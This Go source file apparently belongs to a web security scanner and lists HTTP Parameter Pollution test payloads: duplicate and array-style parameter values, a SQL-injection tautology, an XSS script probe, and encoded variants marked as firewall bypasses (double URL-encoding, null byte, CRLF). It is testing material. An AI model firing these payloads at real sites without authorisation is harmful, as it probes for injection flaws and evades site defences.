package hpp

// Payload represents an HTTP Parameter Pollution test payload.
type Payload struct {
	// Value is the injected parameter value used during testing.
	Value string
	// Description explains what the payload tests for.
	Description string
	// WAFBypass indicates whether this payload is designed to evade WAF detection.
	WAFBypass bool
}

// GetPayloads returns common HPP test payloads including basic duplicate
// parameters, array-style parameters, and different encoding variants.
func GetPayloads() []Payload {
	return payloads
}

// payloads contains the default set of HPP test values.
// Source: OWASP WSTG-INPV-04, PayloadsAllTheThings
var payloads = []Payload{
	// Basic duplicate parameter payloads
	{
		Value:       "hpp_test_injected",
		Description: "Basic duplicate parameter with distinct value",
		WAFBypass:   false,
	},
	{
		Value:       "hpp_override",
		Description: "Override attempt with second parameter value",
		WAFBypass:   false,
	},
	{
		Value:       "1 OR 1=1",
		Description: "SQLi-like payload via duplicate parameter to bypass validation",
		WAFBypass:   false,
	},
	{
		Value:       "<script>alert(1)</script>",
		Description: "XSS payload via duplicate parameter to bypass sanitization",
		WAFBypass:   false,
	},

	// Array-style parameter payloads
	{
		Value:       "[]=injected",
		Description: "Array-style parameter array notation injection",
		WAFBypass:   false,
	},
	{
		Value:       "[0]=injected",
		Description: "Array-style parameter indexed injection",
		WAFBypass:   false,
	},
	{
		Value:       "[][]=nested",
		Description: "Array-style nested array parameter injection",
		WAFBypass:   false,
	},

	// Encoding variant payloads
	{
		Value:       "hpp%26test%3Dinjected",
		Description: "URL-encoded ampersand and equals for parameter smuggling",
		WAFBypass:   true,
	},
	{
		Value:       "hpp%2526test%253Dinjected",
		Description: "Double URL-encoded parameter separator bypass",
		WAFBypass:   true,
	},
	{
		Value:       "value%00injected",
		Description: "Null byte encoded within parameter value",
		WAFBypass:   true,
	},
	{
		Value:       "value%0d%0ainjected",
		Description: "CRLF encoded within parameter value",
		WAFBypass:   true,
	},

	// Semicolon separator variant
	{
		Value:       "value;param=injected",
		Description: "Semicolon as alternative parameter separator",
		WAFBypass:   true,
	},

	// Comma-separated values
	{
		Value:       "original,injected",
		Description: "Comma-separated duplicate value injection",
		WAFBypass:   false,
	},
}
